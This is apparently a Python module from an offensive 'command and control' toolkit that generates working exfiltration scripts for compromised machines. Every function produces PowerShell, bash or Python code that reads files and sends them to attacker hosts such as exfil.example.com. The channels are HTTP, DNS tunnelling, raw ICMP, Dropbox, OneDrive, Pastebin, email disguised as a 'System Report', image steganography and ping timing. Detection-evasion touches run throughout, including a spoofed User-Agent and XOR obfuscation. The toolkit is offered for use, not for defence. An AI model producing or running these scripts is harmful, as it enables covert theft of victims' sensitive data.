"""
KRYON Command & Control - Data Exfiltration Channels

Covert data exfiltration from compromised systems.

Clearance Level: Omega-Strike (Command & Control Authority)
Specialization: Data exfiltration, covert channels, stealth transfer
Mission: Extract sensitive data without detection

This module provides:
- HTTP/HTTPS exfiltration
- DNS tunneling exfiltration
- ICMP tunneling
- Cloud storage exfiltration (Dropbox, OneDrive, Google Drive)
- Email exfiltration
- Steganography-based exfiltration
- Timing-based covert channels
"""

import base64
import secrets
from typing import Any, Optional


def exfiltrate_via_http(
    file_path: str,
    exfil_url: str,
    method: str = "POST",
    chunk_size: int = 1024 * 1024,
    encrypted: bool = True,
    user_agent: Optional[str] = None,
) -> dict[str, Any]:
    """
    Exfiltrate file via HTTP/HTTPS POST.

    Features:
    - Chunked upload for large files
    - XOR encryption
    - Custom User-Agent
    - Base64 encoding

    Args:
        file_path: File to exfiltrate
        exfil_url: Exfiltration server URL
        method: HTTP method (POST, PUT)
        chunk_size: Bytes per request
        encrypted: Encrypt with XOR
        user_agent: Custom User-Agent

    Returns:
        HTTP exfiltration status and PowerShell script

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_http
        >>>
        >>> # Exfiltrate file via HTTPS
        >>> result = exfiltrate_via_http(
        ...     file_path="C:\\\\Users\\\\admin\\\\Documents\\\\secrets.txt",
        ...     exfil_url="https://exfil.example.com/upload",
        ...     encrypted=True
        ... )
        >>>
        >>> # Execute PowerShell on target:
        >>> print(result['powershell_script'])
    """
    results = {
        "file": file_path,
        "exfil_url": exfil_url,
        "method": method,
        "encrypted": encrypted,
        "powershell_script": "",
        "bash_script": "",
        "success": False,
        "error": None,
    }

    try:
        user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        # PowerShell exfiltration script
        if encrypted:
            ps_script = f"""
# HTTP Exfiltration with Encryption
$file = "{file_path}"
$url = "{exfil_url}"
$key = {secrets.randbelow(256)}

# Read file
$bytes = [System.IO.File]::ReadAllBytes($file)

# XOR encrypt
$encrypted = @()
for($i=0; $i -lt $bytes.Length; $i++){{
    $encrypted += $bytes[$i] -bxor $key
}}

# Base64 encode
$encoded = [Convert]::ToBase64String($encrypted)

# Upload
$headers = @{{"User-Agent"="{user_agent}"}}
Invoke-WebRequest -Uri $url -Method {method} -Body $encoded -Headers $headers -UseBasicParsing
"""
        else:
            ps_script = f"""
# HTTP Exfiltration
$file = "{file_path}"
$url = "{exfil_url}"

# Read and encode file
$bytes = [System.IO.File]::ReadAllBytes($file)
$encoded = [Convert]::ToBase64String($bytes)

# Upload
$headers = @{{"User-Agent"="{user_agent}"}}
Invoke-WebRequest -Uri $url -Method {method} -Body $encoded -Headers $headers -UseBasicParsing
"""

        results["powershell_script"] = ps_script

        # Bash version
        results["bash_script"] = f"""
#!/bin/bash
# HTTP Exfiltration
file="{file_path}"
url="{exfil_url}"

# Base64 encode and upload
base64 "$file" | curl -X {method} -H "User-Agent: {user_agent}" -d @- "$url"
"""

        results["success"] = True
        results["info"] = "Execute script on target to exfiltrate file"

    except Exception as e:
        results["error"] = str(e)

    return results


def exfiltrate_via_dns(data: str, domain: str, subdomain_prefix: str = "data", chunk_size: int = 60) -> dict[str, Any]:
    """
    Exfiltrate data via DNS queries.

    DNS exfiltration encodes data in subdomain names:
    - data.ENCODED_CHUNK.example.com

    Args:
        data: Data to exfiltrate (string)
        domain: Attacker-controlled domain
        subdomain_prefix: Prefix for subdomains
        chunk_size: Characters per DNS query

    Returns:
        DNS exfiltration script and queries

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_dns
        >>>
        >>> # Exfiltrate via DNS
        >>> result = exfiltrate_via_dns(
        ...     data="admin:P@ssw0rd123",
        ...     domain="exfil.example.com",
        ...     chunk_size=60
        ... )
        >>>
        >>> # DNS queries generated:
        >>> for query in result['dns_queries']:
        ...     print(query)
        >>>
        >>> # Setup authoritative DNS server for domain to capture queries
    """
    results = {
        "data_length": len(data),
        "domain": domain,
        "chunk_size": chunk_size,
        "total_queries": 0,
        "dns_queries": [],
        "powershell_script": "",
        "success": False,
        "error": None,
    }

    try:
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()

        # Split into chunks
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        results["total_queries"] = len(chunks)

        # Generate DNS queries
        for i, chunk in enumerate(chunks):
            query = f"{subdomain_prefix}.{i}.{chunk}.{domain}"
            results["dns_queries"].append(query)

        # PowerShell DNS exfiltration script
        results["powershell_script"] = f"""
# DNS Exfiltration
$data = Get-Content "{data}" -Raw
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
$domain = "{domain}"
$chunkSize = {chunk_size}

# Split into chunks
for($i=0; $i -lt $encoded.Length; $i+=$chunkSize){{
    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
    $query = "$i.$chunk.$domain"
    Resolve-DnsName $query -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 100
}}
"""

        # Bash version
        results["bash_script"] = f"""
#!/bin/bash
# DNS Exfiltration
data=$(cat "{data}" | base64 -w 0)
domain="{domain}"
chunk_size={chunk_size}

i=0
while [ $i -lt ${{#data}} ]; do
    chunk=${{data:$i:$chunk_size}}
    nslookup "$i.$chunk.$domain" > /dev/null 2>&1
    i=$((i + chunk_size))
    sleep 0.1
done
"""

        results["success"] = True
        results["info"] = f"Exfiltration requires {results['total_queries']} DNS queries"
        results["server_setup"] = f"""
Setup DNS server to capture queries:
1. Configure authoritative DNS for {domain}
2. Log all DNS queries
3. Extract and decode data from subdomain names
"""

    except Exception as e:
        results["error"] = str(e)

    return results


def exfiltrate_via_icmp(file_path: str, destination_ip: str, chunk_size: int = 32) -> dict[str, Any]:
    """
    Exfiltrate file via ICMP echo requests.

    Encodes file data in ICMP packet payloads.

    Args:
        file_path: File to exfiltrate
        destination_ip: Attacker's IP address
        chunk_size: Bytes per ICMP packet

    Returns:
        ICMP exfiltration script

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_icmp
        >>>
        >>> # Exfiltrate via ICMP
        >>> result = exfiltrate_via_icmp(
        ...     file_path="C:\\\\secrets.txt",
        ...     destination_ip="10.10.10.5",
        ...     chunk_size=32
        ... )
        >>>
        >>> # On attacker machine, capture ICMP:
        >>> # tcpdump -i eth0 icmp -w exfil.pcap
        >>> # Extract data from ICMP payloads
    """
    results = {
        "file": file_path,
        "destination": destination_ip,
        "chunk_size": chunk_size,
        "powershell_script": "",
        "python_script": "",
        "success": False,
        "error": None,
    }

    try:
        # PowerShell ICMP exfiltration
        results["powershell_script"] = f"""
# ICMP Exfiltration
$file = "{file_path}"
$dest = "{destination_ip}"

# Read file
$bytes = [System.IO.File]::ReadAllBytes($file)
$encoded = [Convert]::ToBase64String($bytes)

# Send via ICMP (requires raw socket - may need custom implementation)
# Alternative: Use ping with data in TTL field or packet size variations
"""

        # Python ICMP exfiltration (more reliable)
        results["python_script"] = f"""
#!/usr/bin/env python3
# ICMP Exfiltration
import base64
import socket
import struct
import time

file_path = "{file_path}"
dest_ip = "{destination_ip}"
chunk_size = {chunk_size}

# Read file
with open(file_path, 'rb') as f:
    data = f.read()

# Base64 encode
encoded = base64.b64encode(data)

# Create raw socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Send chunks via ICMP
for i in range(0, len(encoded), chunk_size):
    chunk = encoded[i:i+chunk_size]

    # Build ICMP echo request
    header = struct.pack('bbHHh', 8, 0, 0, 0, i)
    packet = header + chunk

    # Send
    sock.sendto(packet, (dest_ip, 0))
    time.sleep(0.05)

sock.close()
"""

        results["success"] = True
        results["info"] = "ICMP exfiltration requires raw sockets or custom implementation"
        results["capture_command"] = f"tcpdump -i eth0 -w exfil.pcap icmp and host {destination_ip}"

    except Exception as e:
        results["error"] = str(e)

    return results


def exfiltrate_via_cloud(
    file_path: str, service: str = "dropbox", credentials: dict[str, str] = None
) -> dict[str, Any]:
    """
    Exfiltrate file to cloud storage.

    Supported services:
    - dropbox: Dropbox
    - onedrive: Microsoft OneDrive
    - gdrive: Google Drive
    - pastebin: Pastebin (for text)

    Args:
        file_path: File to exfiltrate
        service: Cloud service
        credentials: API credentials (access_token, etc.)

    Returns:
        Cloud exfiltration script

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_cloud
        >>>
        >>> # Exfiltrate to Dropbox
        >>> result = exfiltrate_via_cloud(
        ...     file_path="C:\\\\secrets.txt",
        ...     service="dropbox",
        ...     credentials={"access_token": "YOUR_TOKEN"}
        ... )
        >>>
        >>> print(result['powershell_script'])
    """
    results = {
        "file": file_path,
        "service": service,
        "powershell_script": "",
        "success": False,
        "error": None,
    }

    try:
        credentials = credentials or {}

        if service == "dropbox":
            access_token = credentials.get("access_token", "YOUR_DROPBOX_TOKEN")
            results["powershell_script"] = f"""
# Dropbox Exfiltration
$file = "{file_path}"
$token = "{access_token}"

# Read file
$bytes = [System.IO.File]::ReadAllBytes($file)

# Upload to Dropbox
$headers = @{{
    "Authorization" = "Bearer $token"
    "Dropbox-API-Arg" = '{{"path":"/exfil/$(Split-Path $file -Leaf)","mode":"add"}}'
    "Content-Type" = "application/octet-stream"
}}

Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $bytes
"""

        elif service == "onedrive":
            access_token = credentials.get("access_token", "YOUR_ONEDRIVE_TOKEN")
            results["powershell_script"] = f"""
# OneDrive Exfiltration
$file = "{file_path}"
$token = "{access_token}"
$filename = Split-Path $file -Leaf

# Read file
$bytes = [System.IO.File]::ReadAllBytes($file)

# Upload to OneDrive
$headers = @{{"Authorization" = "Bearer $token"}}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root:/exfil/$filename:/content" -Method Put -Headers $headers -Body $bytes
"""

        elif service == "pastebin":
            api_key = credentials.get("api_key", "YOUR_PASTEBIN_KEY")
            results["powershell_script"] = f"""
# Pastebin Exfiltration (text files only)
$file = "{file_path}"
$apiKey = "{api_key}"

# Read file
$content = Get-Content $file -Raw

# Upload to Pastebin
$body = @{{
    api_dev_key = $apiKey
    api_option = "paste"
    api_paste_code = $content
    api_paste_private = "1"
}}

Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body $body
"""

        results["success"] = True
        results["info"] = f"Exfiltration via {service} - requires valid credentials"

    except Exception as e:
        results["error"] = str(e)

    return results


def exfiltrate_via_email(
    file_path: str,
    smtp_server: str,
    smtp_port: int = 587,
    from_email: str = "",
    to_email: str = "",
    password: str = "",
    use_tls: bool = True,
) -> dict[str, Any]:
    """
    Exfiltrate file via email attachment.

    Args:
        file_path: File to exfiltrate
        smtp_server: SMTP server (smtp.gmail.com)
        smtp_port: SMTP port
        from_email: Sender email
        to_email: Recipient email (attacker)
        password: Email password
        use_tls: Use TLS encryption

    Returns:
        Email exfiltration script

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_email
        >>>
        >>> # Exfiltrate via Gmail
        >>> result = exfiltrate_via_email(
        ...     file_path="C:\\\\secrets.txt",
        ...     smtp_server="smtp.gmail.com",
        ...     smtp_port=587,
        ...     from_email="compromised@gmail.com",
        ...     to_email="attacker@gmail.com",
        ...     password="<REDACTED>"
        ... )
    """
    results = {
        "file": file_path,
        "smtp_server": smtp_server,
        "to_email": to_email,
        "powershell_script": "",
        "python_script": "",
        "success": False,
        "error": None,
    }

    try:
        # PowerShell email exfiltration
        results["powershell_script"] = f"""
# Email Exfiltration
$file = "{file_path}"
$smtp = "{smtp_server}"
$port = {smtp_port}
$from = "{from_email}"
$to = "{to_email}"
$pass = ConvertTo-SecureString "{password}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($from, $pass)

# Create email
$msg = New-Object System.Net.Mail.MailMessage
$msg.From = $from
$msg.To.Add($to)
$msg.Subject = "System Report"
$msg.Body = "Automated report attached"

# Attach file
$attachment = New-Object System.Net.Mail.Attachment($file)
$msg.Attachments.Add($attachment)

# Send
$client = New-Object System.Net.Mail.SmtpClient($smtp, $port)
$client.EnableSsl = $true
$client.Credentials = $cred
$client.Send($msg)

# Cleanup
$attachment.Dispose()
$msg.Dispose()
"""

        # Python version
        results["python_script"] = f"""
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Email configuration
smtp_server = "{smtp_server}"
smtp_port = {smtp_port}
from_email = "{from_email}"
to_email = "{to_email}"
password = "{password}"
file_path = "{file_path}"

# Create message
msg = MIMEMultipart()
msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = "System Report"
msg.attach(MIMEText("Automated report attached", 'plain'))

# Attach file
with open(file_path, 'rb') as f:
    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(f.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename={{file_path}}')
    msg.attach(attachment)

# Send
server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(from_email, password)
server.send_message(msg)
server.quit()
"""

        results["success"] = True
        results["info"] = "Email exfiltration requires valid SMTP credentials"

    except Exception as e:
        results["error"] = str(e)

    return results


def exfiltrate_via_steganography(
    data_file: str, cover_image: str, output_image: str, method: str = "lsb"
) -> dict[str, Any]:
    """
    Hide data in image using steganography.

    Methods:
    - lsb: Least Significant Bit encoding
    - metadata: Hide in EXIF metadata

    Args:
        data_file: File to hide
        cover_image: Cover image
        output_image: Output image with hidden data
        method: Steganography method

    Returns:
        Steganography encoding/decoding scripts

    Example:
        >>> from kryon.tools.command_and_control import exfiltrate_via_steganography
        >>>
        >>> # Hide data in image
        >>> result = exfiltrate_via_steganography(
        ...     data_file="secrets.txt",
        ...     cover_image="photo.png",
        ...     output_image="photo_with_data.png",
        ...     method="lsb"
        ... )
        >>>
        >>> # Output image looks normal but contains hidden data
        >>> # Upload to social media, send via email, etc.
    """
    results = {
        "data_file": data_file,
        "cover_image": cover_image,
        "output_image": output_image,
        "method": method,
        "python_encode_script": "",
        "python_decode_script": "",
        "success": False,
        "error": None,
    }

    try:
        if method == "lsb":
            # LSB steganography encode
            results["python_encode_script"] = f"""
#!/usr/bin/env python3
# LSB Steganography - Encode
from PIL import Image
import base64

# Read data
with open("{data_file}", 'rb') as f:
    data = f.read()

# Base64 encode
encoded = base64.b64encode(data)
data_bits = ''.join(format(byte, '08b') for byte in encoded)

# Load image
img = Image.open("{cover_image}")
pixels = img.load()

# Embed data in LSB
width, height = img.size
data_index = 0

for y in range(height):
    for x in range(width):
        if data_index < len(data_bits):
            r, g, b = pixels[x, y][:3]

            # Modify LSB of each channel
            if data_index < len(data_bits):
                r = (r & 0xFE) | int(data_bits[data_index])
                data_index += 1

            pixels[x, y] = (r, g, b) if len(pixels[x, y]) == 3 else (r, g, b, pixels[x, y][3])

# Save
img.save("{output_image}")
"""

            # LSB steganography decode
            results["python_decode_script"] = f"""
#!/usr/bin/env python3
# LSB Steganography - Decode
from PIL import Image
import base64

# Load image
img = Image.open("{output_image}")
pixels = img.load()

# Extract LSB
width, height = img.size
bits = ""

for y in range(height):
    for x in range(width):
        r = pixels[x, y][0]
        bits += str(r & 1)

# Convert to bytes
bytes_data = bytearray()
for i in range(0, len(bits), 8):
    byte = bits[i:i+8]
    if len(byte) == 8:
        bytes_data.append(int(byte, 2))

# Decode
decoded = base64.b64decode(bytes_data)

# Save
with open("extracted.dat", 'wb') as f:
    f.write(decoded)
"""

        results["success"] = True
        results["info"] = "Steganography requires PIL/Pillow library"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_covert_timing_channel(data: str, ping_target: str, bit_delay_ms: int = 100) -> dict[str, Any]:
    """
    Create timing-based covert channel.

    Encodes data in timing delays between packets.

    Args:
        data: Data to transmit
        ping_target: Target to ping
        bit_delay_ms: Delay for bit encoding (ms)

    Returns:
        Timing channel transmission script

    Example:
        >>> from kryon.tools.command_and_control import create_covert_timing_channel
        >>>
        >>> # Transmit data via timing
        >>> result = create_covert_timing_channel(
        ...     data="SECRET",
        ...     ping_target="8.8.8.8",
        ...     bit_delay_ms=100
        ... )
        >>>
        >>> # Attacker captures packets and measures timing to decode data
    """
    results = {
        "data": data,
        "target": ping_target,
        "bit_delay": bit_delay_ms,
        "powershell_script": "",
        "success": False,
        "error": None,
    }

    try:
        # Encode data to binary
        "".join(format(ord(c), "08b") for c in data)

        results["powershell_script"] = f"""
# Timing Covert Channel
$data = "{data}"
$target = "{ping_target}"
$delay = {bit_delay_ms}

# Convert to binary
$binary = -join ($data.ToCharArray() | ForEach-Object {{[Convert]::ToString([int][char]$_, 2).PadLeft(8, '0')}})

# Transmit via timing
foreach ($bit in $binary.ToCharArray()) {{
    # Send ping
    Test-Connection $target -Count 1 -Quiet | Out-Null

    # Delay based on bit value
    if ($bit -eq '1') {{
        Start-Sleep -Milliseconds ($delay * 2)
    }} else {{
        Start-Sleep -Milliseconds $delay
    }}
}}
"""

        results["success"] = True
        results["info"] = "Decode by measuring inter-packet timing: longer delay = 1, shorter = 0"

    except Exception as e:
        results["error"] = str(e)

    return results
